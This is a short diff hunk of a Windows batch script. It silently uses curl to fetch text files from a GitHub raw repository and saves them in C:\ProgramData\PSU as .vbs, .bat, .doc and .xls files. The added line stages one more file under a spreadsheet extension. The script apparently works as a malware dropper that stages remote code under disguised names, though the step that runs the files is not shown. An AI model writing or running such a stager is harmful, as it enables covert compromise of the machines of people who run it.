@@ -10,6 +10,7 @@ curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/config.txt"
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/execute.txt" -o "C:\ProgramData\PSU\execute.vbs" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/process.txt" -o "C:\ProgramData\PSU\process.bat" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/run.txt" -o "C:\ProgramData\PSU\run.doc" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/run2.txt" -o "C:\ProgramData\PSU\run.xls" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/samba.txt" -o "C:\ProgramData\PSU\samba.vbs" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/smb.txt" -o "C:\ProgramData\PSU\smb.bat" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/start.txt" -o "C:\ProgramData\PSU\start.vbs" >> nul
